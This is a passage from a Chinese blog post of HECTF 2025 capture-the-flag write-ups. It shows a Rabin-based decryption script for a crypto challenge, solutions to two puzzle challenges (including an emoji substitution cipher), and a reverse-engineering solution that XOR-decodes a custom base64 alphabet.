candidates_3 = <span class="built_in">list</span>(candidates_3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;第3次开方（得到m的候选解）：共<span class="subst">&#123;<span class="built_in">len</span>(candidates_3)&#125;</span>个&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证候选解：确保m^8 ≡ c mod n（过滤无效解）</span></span><br><span class="line">    valid_m = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> candidates_3:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(m, e, n) == c:</span><br><span class="line">            valid_m.append(m)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> valid_m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_flag</span>(<span class="params">valid_m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;筛选有效flag（可打印字符、含flag格式）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n========== 开始筛选有效flag ==========&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(valid_m):</span><br><span class="line">        <span class="comment"># 两种字节转换方式（兼容不同库）</span></span><br><span class="line">        bytes1 = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">        bytes2 = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="comment"># 尝试解码为可打印字符串</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text1 = bytes1.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            text2 = bytes2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            text1 = <span class="string">&quot;无法解码&quot;</span></span><br><span class="line">            text2 = <span class="string">&quot;无法解码&quot;</span></span><br><span class="line">        <span class="comment"># 打印候选结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n候选解<span class="subst">&#123;idx+<span class="number">1</span>&#125;</span>：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;明文m：<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;long_to_bytes结果：<span class="subst">&#123;bytes1&#125;</span> | 解码后：<span class="subst">&#123;text1&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;libnum.n2s结果：<span class="subst">&#123;bytes2&#125;</span> | 解码后：<span class="subst">&#123;text2&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 筛选含flag标识的有效结果</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text1 <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> text1 <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text2 <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> text2:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;★ 找到有效flag：<span class="subst">&#123;text1 <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text1 <span class="keyword">else</span> text2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> m, text1 <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text1 <span class="keyword">else</span> text2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n未自动筛选到flag，请手动查看候选解中的可打印字符串&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1. 连续3次Rabin开方，求解所有有效明文候选</span></span><br><span class="line">    valid_m_list = solve_e8_with_rabin(c, p, q, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n验证后有效明文候选数：<span class="subst">&#123;<span class="built_in">len</span>(valid_m_list)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 筛选并输出flag</span></span><br><span class="line">    final_m, final_flag = filter_flag(valid_m_list)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 最终结果汇总</span></span><br><span class="line">    <span class="keyword">if</span> final_flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n========== 解密完成 ==========&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;最终明文m：<span class="subst">&#123;final_m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;最终flag：<span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n========== 解密结束：未找到明确flag，请手动核对候选解 ==========&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#最终flag：HECTF&#123;this_is_a_flag_emm_is_a_true_flag_ok_all_right&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> MISC</h1>
<h2 id="签到"><a class="markdownIt-Anchor" href="#签到">#</a> <strong>签到</strong></h2>
<blockquote>
<p>关注凌武科技微信公众号，关注公众号后发送 “2025HECTF，启动！！！”，获得小惊喜！！！</p>
</blockquote>
<p>​		做法就是题目描述字面意思。</p>
<h2 id="check_in"><a class="markdownIt-Anchor" href="#check_in">#</a> <strong>Check_In</strong></h2>
<blockquote>
<p>🎵 🍑🎲⚽🍉 🚃</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf i love u -&gt; 🎹🏀🌺 🎵 🍑🎲⚽🍉 🚃</span><br><span class="line">$flag -&gt; 🌹🍉🎹🏀🌺&#123;🚇🍉🍑🎹🎲⚾🍉_🏀🎲_🌹🍉🎹🏀🌺_🌹🎲🏉🍉_💎🎲🚃_🎹🏓🌾_🍉🌾🍇🎲💎_🎵🏀&#125;</span><br></pre></td></tr></table></figure>
<p>​		这几个是一一对应的，hectf 就是🌹🍉🎹🏀🌺，可以得到一一对应的关系，之后得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hectf&#123;🚇elco⚾e_to_hectf_ho🏉e_💎ou_c🏓🌾_e🌾🍇o💎_it&#125;</span><br></pre></td></tr></table></figure>
<p>​		看起来这个 flag 是可读的，找 ai 看着来来回回脑洞推测可能是 welcome to hectf hope you can enjoy it，最后的 flag：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;welcome<span class="built_in">_</span>to<span class="built_in">_</span>hectf<span class="built_in">_</span>hope<span class="built_in">_</span>you<span class="built_in">_</span>can<span class="built_in">_</span>enjoy<span class="built_in">_</span>it&#125;</span><br></pre></td></tr></table></figure>
<h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse">#</a> Reverse</h1>
<h2 id="easyree"><a class="markdownIt-Anchor" href="#easyree">#</a> <strong>easyree</strong></h2>
<p>​		反编译之后，三个函数，先看第一个：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1389</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  std::string::<span class="built_in">basic_string</span>();</span><br><span class="line">  std::string::<span class="built_in">reserve</span>(a1, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)(byte_2040[i] ^ <span class="number">0x55</span>));</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		一个异或，提取数据：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="number">15</span>,  <span class="number">12</span>,  <span class="number">13</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">4</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">24</span>,  <span class="number">25</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">18</span>,</span><br><span class="line">       <span class="number">19</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">20</span>,  <span class="number">47</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">34</span>,</span><br><span class="line">       <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">36</span>,  <span class="number">37</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">56</span>,</span><br><span class="line">       <span class="number">57</span>,  <span class="number">62</span>,  <span class="number">63</span>,  <span class="number">60</span>,  <span class="number">61</span>,  <span class="number">50</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">54</span>,</span><br><span class="line">       <span class="number">55</span>,  <span class="number">52</span>, <span class="number">108</span>, <span class="number">109</span>,  <span class="number">98</span>,  <span class="number">99</span>,  <span class="number">96</span>,  <span class="number">97</span>, <span class="number">102</span>, <span class="number">103</span>,</span><br><span class="line">      <span class="number">100</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">122</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<p>​		第二个函数，也是异或：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_143F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  std::string::<span class="built_in">basic_string</span>();</span><br><span class="line">  std::string::<span class="built_in">reserve</span>();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i )</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)(byte_2080[i] ^ <span class="number">0x33</span>));</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		提取数据：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars2[] =</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">123</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>,   <span class="number">1</span>,  <span class="number">68</span>,   <span class="number">4</span>,</span><br><span class="line">                <span class="number">118</span>,  <span class="number">91</span>, <span class="number">113</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">84</span>, <span class="number">125</span>,  <span class="number">11</span>,   <span class="number">3</span>,  <span class="number">10</span>,</span><br><span class="line">                <span class="number">125</span>, <span class="number">102</span>,   <span class="number">3</span>,  <span class="number">81</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">113</span>,  <span class="number">82</span>,  <span class="number">75</span>,  <span class="number">66</span>,</span><br><span class="line">                <span class="number">126</span>,  <span class="number">92</span>, <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">75</span>,  <span class="number">87</span>,  <span class="number">75</span>,  <span class="number">66</span>, <span class="number">102</span>,  <span class="number">67</span>,</span><br><span class="line">                <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">71</span>,  <span class="number">80</span>,  <span class="number">69</span>, <span class="number">100</span>, <span class="number">102</span>,   <span class="number">3</span></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
<p>​		解密脚本：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="number">15</span>,  <span class="number">12</span>,  <span class="number">13</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">4</span>,</span><br><span class="line">            <span class="number">5</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">24</span>,  <span class="number">25</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">18</span>,</span><br><span class="line">           <span class="number">19</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">20</span>,  <span class="number">47</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">34</span>,</span><br><span class="line">           <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">36</span>,  <span class="number">37</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">56</span>,</span><br><span class="line">           <span class="number">57</span>,  <span class="number">62</span>,  <span class="number">63</span>,  <span class="number">60</span>,  <span class="number">61</span>,  <span class="number">50</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">54</span>,</span><br><span class="line">           <span class="number">55</span>,  <span class="number">52</span>, <span class="number">108</span>, <span class="number">109</span>,  <span class="number">98</span>,  <span class="number">99</span>,  <span class="number">96</span>,  <span class="number">97</span>, <span class="number">102</span>, <span class="number">103</span>,</span><br><span class="line">          <span class="number">100</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">122</span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">64</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;base64表异或后：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; i++)&#123;</span><br><span class="line">        temp[i] = ida_chars[i] ^ <span class="number">0x55</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars2[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">123</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>,   <span class="number">1</span>,  <span class="number">68</span>,   <span class="number">4</span>,</span><br><span class="line">                    <span class="number">118</span>,  <span class="number">91</span>, <span class="number">113</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">84</span>, <span class="number">125</span>,  <span class="number">11</span>,   <span class="number">3</span>,  <span class="number">10</span>,</span><br><span class="line">                    <span class="number">125</span>, <span class="number">102</span>,   <span class="number">3</span>,  <span class="number">81</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">113</span>,  <span class="number">82</span>,  <span class="number">75</span>,  <span class="number">66</span>,</span><br><span class="line">                    <span class="number">126</span>,  <span class="number">92</span>, <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">75</span>,  <span class="number">87</span>,  <span class="number">75</span>,  <span class="number">66</span>, <span class="number">102</span>,  <span class="number">67</span>,</span><br><span class="line">                    <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">71</span>,  <span class="number">80</span>,  <span class="number">69</span>, <span class="number">100</span>, <span class="number">102</span>,   <span class="number">3</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp2[<span class="number">64</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文异或后：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)&#123;</span><br><span class="line">        temp2[i] = ida_chars2[i] ^ <span class="number">0x33</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		输出结果：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64表异或后：ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/</span><br><span class="line">密文异或后：HVEWEVA2w7EhBaYgN809NU0bACBaxqMoC6xdxqUpC6tcvWU0</span><br></pre></td></tr></table></figure>
<p>​		根据输出结果看出来是 base64 变表，解码得到 flag：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;welc0m3<span class="built_in">_</span>t0<span class="built_in">_</span>rev3r3e<span class="built_in">_</span>w0r1d<span class="built_in">_</span>x1x1&#125;</span><br></pre></td></tr></table></figure>

      <div class="tags">
          <a href="/tags/Game/" rel="tag"><i class="ic i-tag"></i> Game</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2026-02-05 17:34:59" itemprop="dateModified" datetime="2026-02-05T17:34:59+08:00">2026-02-05</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="g01den 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="g01den 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://blog.g01den.top/posts/215f7d8b.html" title="【2025】HECTF">http://blog.g01den.top/posts/215f7d8b.html</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/posts/2d792864.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2026&#x2F;02&#x2F;05&#x2F;iPxw75rVysjnd1o.jpg" title="Python栈帧逃逸">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
  <h3>Python栈帧逃逸</h3>
  </a>

    </div>
    <div class="item right">
    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E7%88%B7%E7%88%B7%E7%9A%84%E9%87%91%E5%9D%97"><span class="toc-number">1.1.</span> <span class="toc-text"> 老爷爷的金块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpgift"><span class="toc-number">1.2.</span> <span class="toc-text"> PHPGift</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%83%8F%E7%B4%A0%E5%8B%87%E8%80%85%E5%92%8C%E7%A5%9E%E7%A7%98%E5%AE%9D%E8%97%8F"><span class="toc-number">1.3.</span> <span class="toc-text"> 像素勇者和神秘宝藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%81%E5%AE%B6blog%E9%87%8C%E6%9C%89%E8%BF%99%E5%8A%9F%E8%83%BD"><span class="toc-number">1.4.</span> <span class="toc-text"> 谁家 blog 里有这功能？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez_include%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text"> ez_include（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E5%AE%9D%E7%9F%B3%E7%9A%84%E6%81%B6%E4%BD%9C%E5%89%A7%E5%A4%8D%E7%8E%B0%E5%85%88%E8%AE%B0%E5%BD%95%E4%B8%8B%E6%9D%A5%E7%BB%86%E7%9C%8B"><span class="toc-number">1.6.</span> <span class="toc-text"> 红宝石的恶作剧（复现，先记录下来，细看）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.7.</span> <span class="toc-text"> 数据管理系统（复现）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">2.</span> <span class="toc-text"> Pwn：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nc%E4%B8%80%E4%B8%8B~"><span class="toc-number">2.1.</span> <span class="toc-text"> nc 一下～</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shop"><span class="toc-number">2.2.</span> <span class="toc-text"> shop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E4%B8%AA%E6%A3%8B%E5%90%A7"><span class="toc-number">3.1.</span> <span class="toc-text"> 下个棋吧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple_math"><span class="toc-number">3.2.</span> <span class="toc-text"> simple_math</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">4.</span> <span class="toc-text"> MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">4.1.</span> <span class="toc-text"> 签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#check_in"><span class="toc-number">4.2.</span> <span class="toc-text"> Check_In</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">5.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyree"><span class="toc-number">5.1.</span> <span class="toc-text"> easyree</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/posts/fe4eec6d.html" rel="bookmark" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></li><li><a href="/posts/955175a5.html" rel="bookmark" title="【2024】H&NCTF">【2024】H&NCTF</a></li><li><a href="/posts/9dd9bec.html" rel="bookmark" title="Ciscn2024">Ciscn2024</a></li><li><a href="/posts/a929fb97.html" rel="bookmark" title="【2023】LitCTF">【2023】LitCTF</a></li><li><a href="/posts/4bf5e0ee.html" rel="bookmark" title="【2024】LitCTF">【2024】LitCTF</a></li><li><a href="/posts/c2860616.html" rel="bookmark" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></li><li><a href="/posts/666fe8df.html" rel="bookmark" title="【2024】强网杯">【2024】强网杯</a></li><li><a href="/posts/de34fe7b.html" rel="bookmark" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a></li><li><a href="/posts/a4378bd0.html" rel="bookmark" title="【2025】LitCTF">【2025】LitCTF</a></li><li class="active"><a href="/posts/215f7d8b.html" rel="bookmark" title="【2025】HECTF">【2025】HECTF</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="g01den"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">g01den</p>
  <div class="description" itemprop="description">golden的部落阁</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">50</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">10</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
